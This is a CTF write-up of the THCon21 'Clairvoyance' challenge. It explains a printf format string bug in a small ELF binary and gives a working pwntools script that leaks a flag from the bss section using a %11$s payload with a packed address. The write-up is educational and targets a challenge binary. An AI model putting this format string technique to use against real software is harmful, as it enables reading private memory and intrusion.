---
title: "THCon21 - Clairvoyance"
date: 2021-06-15T16:29:06+02:00
draft: false
tags: [pwn]
# image: "/image/blog-pic.jpg"
description: "A format string pwn challenge from THCon21"
showDate: true          # to enable/disable showing dates
math: true              # to enable showing equations (katex)
---

[Go back to write-ups list](../)

> **Category:** Intro
> 
> **Creator:** Voydstack
> 
> **Description:**
> 
> Do you have enough clairvoyance to read the flag inside my mind ?
> 
> **Attachments:**
> - [clairvoyance](/files/thcon21/clairvoyance)

## Analysing the binary

The attachment is an ELF x64 binary. Again, I opened it in IDA and went to the `main` function.

![Clairvoyance main](/image/thcon21/clairvoyance.png "Clairvoyance main")

To put it simply, the program asks you for your name and whether you want to read the flag. If you say "yes" to the latter, it will blow you off (and if you say something else, it'll just say bye as well).

The weakness here is that the program uses `printf(name)` after saying "nice try", which makes it vulnerable to a format string bug in the name you enter.

Now let's look at the read_flag function, since the flag is not used anywhere in `main` but is probably loaded in memory.

![Clairvoyance main](/image/thcon21/read_flag.png)

Bingo! The content of the file `flag.txt` is read into the `flag` variable. However, `flag` is located in the bss section, not on the stack, when printf will read its arguments on the stack.

![flag on bss](/image/thcon21/bss.png)

But that's not really an issue.

## Exploiting the format string bug

![Awesome meme you are missing :cry:](/image/thcon21/funm.png "r/AAAAAAAAAAAAAAAAA")

The address of the flag isn't on the stack, but our user input is. For example, here is what I get when I input `AAAAAAAA%p%p%p%p%p%p%p%p%p%p`:

```
Nice try, but no flag for you, AAAAAAAA0x7ffeb09c38c0(nil)(nil)0x50x1f0x7ffeb09c60780x100401365(nil)0xa7365790x4141414141414141
```
(I'd gladly put spaces between the `%p` but we're limited to 31 characters in total...)

Here, you can see that the beginning of our user input `AAAAAAAA` (or `0x4141414141414141`) shows up at the end, so at the 10th `%p`, which means that if we send `AAAAAAAA%10$s`, printf will try to display the string at the address `0x4141414141414141`.

Now if we replace `AAAAAAAA` by the address of `flag`, it should print the flag, right? Well, almost.

As you can see in the bss screenshot, the address of the flag is `0x0000000000404080`, which means that you'll have to throw in a bunch of null bytes, and fgets will stop reading your input once it sees a null byte.

So the little trick we're going to make is:
- Send `%11$s`
- Send 3 `A` for padding (making the length = 8), so that our address is fully on the 11th slot
- Send our address

*Note: the actual address starts with null bytes as you can see on the screenshot. Fortunately, we have to send it backwards to the program (because of a different endianness), so the non-null bytes go first!*

Now here is a little python script using pwntools that does exactly what we want:

```py
from pwn import *

elf = ELF("clairvoyance")
bss = elf.symbols["flag"]        # Loads the address of the flag
payload = b'%11$sAAA' + p64(bss) # p64 converts it to 8 bytes with the right endian
print(payload)

p = process("./clairvoyance")
p.recv()
p.sendline(payload)
p.recv()
p.sendline(b"yes")
print(p.recv())
```

![Clairvoyance solved](/image/thcon21/clairvoyance_solved.png)

*Note: as you can see on the screenshot, the binary has No PIE, so the address of `flag` in the bss doesn't change. Otherwise, the challenge would've been more complicated.*


[Go back to write-ups list](../)